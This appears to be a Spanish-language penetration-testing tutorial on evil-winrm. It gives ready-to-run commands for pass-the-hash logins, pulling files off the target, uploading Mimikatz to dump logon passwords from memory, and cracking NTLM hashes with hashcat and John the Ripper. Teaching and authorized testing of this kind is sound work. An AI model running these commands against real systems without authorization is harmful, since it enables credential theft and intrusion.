# 🛡️ ¿Qué es `evil-winrm` y cómo usarlo para pruebas de penetración?  

`evil-winrm` es una herramienta poderosa, escrita en Ruby, que permite acceder a máquinas Windows remotas mediante **WinRM (Web Remote Management)**. Es una herramienta clave en la caja de herramientas de cualquier profesional de ciberseguridad o auditor de sistemas.

---

## 🔧 ¿Para qué sirve?

- **Acceso remoto seguro** a servidores Windows habilitados para WinRM.

- **Autenticación flexible**: soporta credenciales en texto plano o hashes NTLM.

- Permite:
  - Ejecutar comandos como si estuvieras en PowerShell.
  - Navegar por el sistema de archivos del objetivo.
  - Subir y bajar archivos.
  - Explorar vulnerabilidades y explotar scripts o aplicaciones web mal configuradas.

---

## 💻 Cómo usar `evil-winrm`

### ✅ Con credenciales

```bash
evil-winrm -i 192.168.1.10 -u Administrator -p password123
```

- `-i`: IP del servidor objetivo.
- `-u`: Nombre de usuario.
- `-p`: Contraseña.

### 🔐 Con hash NTLM

```bash
evil-winrm -i 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

- `-H`: Hash NTLM del usuario (`<LM_HASH>:<NTLM_HASH>`).

---

### 🛠️ Opciones adicionales útiles

| Opción | Descripción |
|--------|-------------|
| `-s`   | Carpeta con scripts Ruby para ejecutar. |
| `-l`   | Carpeta local para guardar archivos descargados. |
| `-P`   | Puerto personalizado (por defecto 5985 para HTTP). |

---

## 🧪 Ejemplo práctico

```bash
evil-winrm -i 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Una vez conectado:

```powershell
PS C:\Users\Administrator\Desktop> dir
PS C:\Users\Administrator\Desktop> whoami
PS C:\Users\Administrator\Desktop> Get-ChildItem
```

---

## 📥 Transferencia de archivos

### Descargar un archivo del servidor

```powershell
download C:\Users\Administrator\Desktop\secreto.txt
```

### Subir un archivo desde tu máquina

```powershell
upload /home/kali/archivo.exe C:\Users\Administrator\Desktop\
```

---

## 🕵️‍♂️ Captura de hashes con `evil-winrm`

Si tienes acceso al sistema, puedes usar **Mimikatz** para extraer hashes de memoria.

### Pasos básicos

1. Subir Mimikatz:

```bash
upload mimikatz_trunk/mimikatz.exe C:\Users\Administrator\Desktop
```

2. Ejecutar Mimikatz:

```powershell
cd C:\Users\Administrator\Desktop
.\mimikatz.exe
```

3. Comandos dentro de Mimikatz:

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Esto te mostrará contraseñas en claro, hashes NTLM y más.

---

## 🔁 Reutilizar hashes obtenidos

Los hashes capturados pueden ser usados con otras herramientas como:

- `evil-winrm` (como ya vimos).
- Herramientas de `Impacket` (`ntlmrelayx.py`, `wmiexec.py`, etc.).

---

## 🔐 ¿Cómo descifrar hashes NTLM?

### Tipos de hashes

| Tipo        | Descripción |
|-------------|-------------|
| **LM Hash** | Obsoleto, fácil de crackear. |
| **NTLM Hash** | Más fuerte, pero también crackeable. |

---

### Herramientas recomendadas

#### 1. `hashcat`

```bash
hashcat -m 1000 hash.txt /ruta/a/diccionario.txt
```

- `-m 1000`: Modo NTLM.
- `hash.txt`: Archivo con los hashes.
- `/ruta/a/diccionario.txt`: Diccionario de contraseñas.

#### 2. `john the ripper`

```bash
john --wordlist=/ruta/a/diccionario.txt hash.txt
```

---

## 📌 Conclusión

`evil-winrm` es una herramienta esencial para profesionales de ciberseguridad, especialmente en entornos Windows. Combina facilidad de uso con potencia, permitiendo tanto acceso remoto como análisis forense y extracción de credenciales.

¡Comparte este contenido y aprendamos juntos! 👨‍💻👩‍💻 #Ciberseguridad #PenTest #EvilWinRM #HashesNTLM #Redes #Cybersecurity #Windows #EthicalHacking

![Evil-WinRM](https://www.kali.org/tools/evil-winrm/images/evil-winrm-logo.svg)
